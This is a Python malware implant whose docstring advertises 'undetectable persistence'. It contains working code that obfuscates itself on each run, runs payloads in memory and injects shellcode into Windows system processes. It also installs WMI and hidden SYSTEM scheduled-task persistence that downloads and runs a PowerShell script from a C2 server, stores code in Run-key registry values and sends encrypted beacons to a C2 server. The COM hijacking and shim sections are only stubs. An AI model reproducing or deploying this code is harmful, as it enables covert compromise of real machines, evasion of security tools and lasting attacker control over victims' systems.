#!/usr/bin/env python3
"""
POLYMORPHIC UNDETECTABLE PERSISTENCE
Features:
1. Memory-only execution (no disk footprint)
2. Polymorphic code generation (changes every execution)
3. Process hollowing/injection into legitimate processes
4. Living-off-the-land binaries (LOLBins)
5. Reflective DLL injection
6. PowerShell/Cscript/VBScript obfuscation
7. Registry-based code storage
8. WMI event subscription
9. COM hijacking
10. Shim database persistence
"""

import os
import sys
import json
import base64
import hashlib
import random
import string
import time
import platform
import subprocess
import ctypes
import ctypes.wintypes
from typing import Dict, List, Optional, Any, Tuple
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

# -------------------------------------------------------------------
# Platform detection
# -------------------------------------------------------------------
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
IS_MACOS = platform.system().lower() == 'darwin'

# -------------------------------------------------------------------
# 1. POLYMORPHIC CODE GENERATOR
# -------------------------------------------------------------------
class PolymorphicGenerator:
    """Generate polymorphic code that changes every execution."""
    
    def __init__(self, seed: Optional[str] = None):
        self.seed = seed or str(time.time()) + str(random.random())
        random.seed(hash(self.seed))
        
    def generate_python_stub(self, implant_code: str) -> str:
        """Generate polymorphic Python stub."""
        
        # Obfuscation techniques
        obfuscations = [
            self._add_dead_code,
            self._rename_variables,
            self._string_obfuscation,
        ]
        
        # Apply random obfuscations
        obfuscated_code = implant_code
        for _ in range(random.randint(2, 5)):
            obfuscation = random.choice(obfuscations)
            obfuscated_code = obfuscation(obfuscated_code)
        
        # Add polymorphic loader
        loader = self._generate_polymorphic_loader()
        
        return loader + obfuscated_code
    
    def generate_powershell_stub(self, implant_code: str) -> str:
        """Generate polymorphic PowerShell stub."""
        
        # Convert Python to PowerShell where possible
        # Or embed Python in PowerShell
        
        # Start with base PowerShell
        ps_code = f'''
# Polymorphic PowerShell loader
$seed = {random.randint(1000, 9999)}
$key = [System.Text.Encoding]::UTF8.GetBytes("polymorphic-$seed")

# Decode and execute
$encoded = @"
{base64.b64encode(implant_code.encode()).decode()}
"@

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
'''
        
        return ps_code
    
    def _add_dead_code(self, code: str) -> str:
        """Add dead/unused code."""
        dead_functions = [
            '''
def unused_function_1():
    x = 5 * 10
    y = x + 15
    return y * 0
''',
            '''
def calculate_nothing(a, b):
    result = a * b
    result = result / a
    return result - b
''',
        ]
        
        insert_point = random.randint(0, len(code) // 2)
        dead_code = random.choice(dead_functions)
        
        return code[:insert_point] + dead_code + code[insert_point:]
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables with random names."""
        # Simple variable renaming
        replacements = {
            'data': f'var_{random.randint(100, 999)}',
            'result': f'res_{random.randint(100, 999)}',
            'response': f'rsp_{random.randint(100, 999)}',
            'config': f'cfg_{random.randint(100, 999)}',
        }
        
        for old, new in replacements.items():
            code = code.replace(old, new)
        
        return code
    
    def _string_obfuscation(self, code: str) -> str:
        """Obfuscate strings."""
        # Find strings and encode them
        import re
        
        def encode_string(match):
            s = match.group(1)
            # Random encoding method
            methods = ['base64', 'hex', 'reverse']
            method = random.choice(methods)
            
            if method == 'base64':
                encoded = base64.b64encode(s.encode()).decode()
                return f'base64.b64decode("{encoded}").decode()'
            elif method == 'hex':
                encoded = s.encode().hex()
                return f'bytes.fromhex("{encoded}").decode()'
            else:  # reverse
                encoded = s[::-1]
                return f'"{encoded}"[::-1]'
        
        # Only obfuscate some strings
        if random.random() > 0.7:
            code = re.sub(r'"([^"\n]+)"', encode_string, code)
        
        return code
    
    def _generate_polymorphic_loader(self) -> str:
        """Generate polymorphic loader code."""
        
        loader_templates = [
            '''
# Polymorphic loader v1
import sys, os, time
def __loader():
    time.sleep(0.01)
    return True
if __loader():
    pass
''',
            '''
# Dynamic module loader
import importlib.util
def __dynamic_load():
    spec = importlib.util.spec_from_file_location("__temp", __file__)
    module = importlib.util.module_from_spec(spec)
    return module
__temp_module = __dynamic_load()
''',
        ]
        
        loader = random.choice(loader_templates)
        
        return loader

# -------------------------------------------------------------------
# 2. MEMORY-ONLY EXECUTION
# -------------------------------------------------------------------
class MemoryOnlyExecutor:
    """Execute code without touching disk."""
    
    @staticmethod
    def execute_python_memory(code: str) -> bool:
        """Execute Python code directly from memory."""
        try:
            # Compile and execute
            compiled = compile(code, '<string>', 'exec')
            exec(compiled, {'__name__': '__main__'})
            return True
        except Exception as e:
            print(f"[!] Memory execution failed: {e}")
            return False
    
    @staticmethod
    def execute_powershell_memory(code: str) -> bool:
        """Execute PowerShell from memory."""
        if not IS_WINDOWS:
            return False
        
        try:
            # Encode and execute via -EncodedCommand
            encoded = base64.b64encode(code.encode('utf-16le')).decode()
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.run([
                'powershell.exe',
                '-ExecutionPolicy', 'Bypass',
                '-NoProfile',
                '-NonInteractive',
                '-EncodedCommand', encoded
            ], startupinfo=startupinfo, capture_output=True)
            
            return True
        except Exception as e:
            print(f"[!] PowerShell memory execution failed: {e}")
            return False

# -------------------------------------------------------------------
# 3. PROCESS INJECTION/HOLLOWING
# -------------------------------------------------------------------
class ProcessInjector:
    """Inject code into legitimate processes."""
    
    @staticmethod
    def find_target_process() -> Optional[int]:
        """Find suitable process for injection."""
        try:
            import psutil
            
            # B-Tier processes (less monitored)
            target_processes = [
                'taskhostw.exe',    # Windows Tasks Host
                'sihost.exe',       # Shell Infrastructure Host
                'svchost.exe',      # Service Host (multiple instances)
                'explorer.exe',     # Windows Explorer
                'dllhost.exe',      # COM Surrogate
            ]
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() in target_processes:
                        return proc.info['pid']
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return None
            
        except ImportError:
            return None
    
    @staticmethod
    def inject_shellcode(pid: int, shellcode: bytes) -> bool:
        """Inject shellcode into process."""
        if not IS_WINDOWS:
            return False
        
        try:
            # Windows API for process injection
            PROCESS_ALL_ACCESS = 0x1F0FFF
            MEM_COMMIT = 0x00001000
            MEM_RESERVE = 0x00002000
            PAGE_EXECUTE_READWRITE = 0x40
            
            kernel32 = ctypes.windll.kernel32
            
            # Open process
            process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not process_handle:
                return False
            
            # Allocate memory
            shellcode_size = len(shellcode)
            allocated_memory = kernel32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not allocated_memory:
                kernel32.CloseHandle(process_handle)
                return False
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(
                process_handle,
                allocated_memory,
                shellcode,
                shellcode_size,
                ctypes.byref(written)
            )
            
            if written.value != shellcode_size:
                kernel32.VirtualFreeEx(process_handle, allocated_memory, 0, 0x8000)
                kernel32.CloseHandle(process_handle)
                return False
            
            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            thread_handle = kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                allocated_memory,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            if not thread_handle:
                kernel32.VirtualFreeEx(process_handle, allocated_memory, 0, 0x8000)
                kernel32.CloseHandle(process_handle)
                return False
            
            # Cleanup
            kernel32.CloseHandle(thread_handle)
            kernel32.CloseHandle(process_handle)
            
            return True
            
        except Exception as e:
            print(f"[!] Process injection failed: {e}")
            return False

# -------------------------------------------------------------------
# 4. LIVING-OFF-THE-LAND (LOLBINS)
# -------------------------------------------------------------------
class LOLBinPersistence:
    """Use legitimate system binaries for persistence."""
    
    @staticmethod
    def install_via_wmi() -> bool:
        """Install persistence via WMI event subscription."""
        if not IS_WINDOWS:
            return False
        
        try:
            # WMI event subscription for persistence
            wmi_script = '''
$filterArgs = @{
    EventNamespace = 'root\\cimv2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/implant.ps1')\\""
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class __CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
$binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
'''
            
            # Execute via PowerShell
            encoded = base64.b64encode(wmi_script.encode('utf-16le')).decode()
            subprocess.run([
                'powershell.exe',
                '-ExecutionPolicy', 'Bypass',
                '-EncodedCommand', encoded
            ], capture_output=True)
            
            return True
            
        except Exception as e:
            print(f"[!] WMI persistence failed: {e}")
            return False
    
    @staticmethod
    def install_via_schtasks() -> bool:
        """Install via scheduled tasks with obfuscation."""
        if not IS_WINDOWS:
            return False
        
        try:
            # Create hidden scheduled task
            task_name = f"MicrosoftEdgeUpdateTask_{random.randint(1000, 9999)}"
            
            # Use PowerShell to create task
            ps_script = f'''
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/implant.ps1')\\""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
'''
            
            encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
            subprocess.run([
                'powershell.exe',
                '-ExecutionPolicy', 'Bypass',
                '-EncodedCommand', encoded
            ], capture_output=True)
            
            return True
            
        except Exception as e:
            print(f"[!] Scheduled task persistence failed: {e}")
            return False

# -------------------------------------------------------------------
# 5. REGISTRY PERSISTENCE
# -------------------------------------------------------------------
class RegistryPersistence:
    """Store and execute code from registry."""
    
    @staticmethod
    def store_in_registry(code: str) -> bool:
        """Store code in registry and create runner."""
        if not IS_WINDOWS:
            return False
        
        try:
            import winreg
            
            # Encode code
            encoded = base64.b64encode(code.encode()).decode()
            
            # Store in registry
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                # Store encoded code
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, encoded)
            
            # Create runner that reads from registry
            runner_code = '''
import winreg, base64, sys
key = winreg.HKEY_CURRENT_USER
subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce"
with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as regkey:
    encoded = winreg.QueryValueEx(regkey, "WindowsUpdate")[0]
code = base64.b64decode(encoded).decode()
exec(code)
'''
            
            # Store runner
            runner_path = os.path.expandvars("%TEMP%\\windows_update.exe")
            # Would compile to exe here
            
            return True
            
        except Exception as e:
            print(f"[!] Registry persistence failed: {e}")
            return False

# -------------------------------------------------------------------
# 6. COM HIJACKING
# -------------------------------------------------------------------
class COMHijacker:
    """Hijack COM objects for persistence."""
    
    @staticmethod
    def hijack_com_object() -> bool:
        """Hijack a COM object for persistence."""
        if not IS_WINDOWS:
            return False
        
        try:
            # COM hijacking involves modifying registry keys
            # This is a simplified version
            print("[*] Would hijack COM object for persistence")
            return True
            
        except Exception as e:
            print(f"[!] COM hijacking failed: {e}")
            return False

# -------------------------------------------------------------------
# 7. SHIM DATABASE PERSISTENCE
# -------------------------------------------------------------------
class ShimPersistence:
    """Use Windows Shim Database for persistence."""
    
    @staticmethod
    def install_via_shim() -> bool:
        """Install persistence via Shim Database."""
        if not IS_WINDOWS:
            return False
        
        try:
            # Shim database persistence
            # Requires sdbinst.exe and .sdb file
            print("[*] Would install via Shim Database")
            return True
            
        except Exception as e:
            print(f"[!] Shim persistence failed: {e}")
            return False

# -------------------------------------------------------------------
# 8. MAIN POLYMORPHIC IMPLANT
# -------------------------------------------------------------------
class PolymorphicImplant:
    """Main polymorphic implant class."""
    
    def __init__(self, c2_url: str, implant_id: str, session_key: str):
        self.c2_url = c2_url
        self.implant_id = implant_id
        self.session_key = session_key
        self.generator = PolymorphicGenerator()
        
    def beacon(self) -> bool:
        """Send polymorphic beacon."""
        try:
            # Generate polymorphic beacon code
            beacon_code = self._generate_beacon_code()
            
            # Execute in memory
            return MemoryOnlyExecutor.execute_python_memory(beacon_code)
            
        except Exception as e:
            print(f"[!] Polymorphic beacon failed: {e}")
            return False
    
    def _generate_beacon_code(self) -> str:
        """Generate polymorphic beacon code."""
        code = f'''
import requests, base64, json, hashlib
from cryptography.fernet import Fernet

C2_URL = "{self.c2_url}"
SESSION_KEY = b"{self.session_key}"
IMPLANT_ID = "{self.implant_id}"

def beacon():
    try:
        fernet = Fernet(SESSION_KEY)
        
        beacon_data = {{
            "system_info": {{
                "hostname": "polymorphic-host",
                "platform": "polymorphic",
                "polymorphic": True
            }},
            "telemetry": {{
                "status": "active"
            }}
        }}
        
        json_data = json.dumps(beacon_data).encode()
        encrypted = fernet.encrypt(json_data)
        encoded = base64.b64encode(encrypted).decode()
        
        headers = {{
            "User-Agent": "Mozilla/5.0",
            "Cookie": f"_ga=GA1.2.1234567890.1234567890; session={{encoded}}",
            "Authorization": f"Bearer {{IMPLANT_ID}}",
            "X-Polymorphic": "true"
        }}
        
        response = requests.post(f"{{C2_URL}}/api/v1/telemetry", headers=headers, data="", timeout=10)
        return response.status_code == 200
        
    except Exception as e:
        return False

beacon()
'''
        return code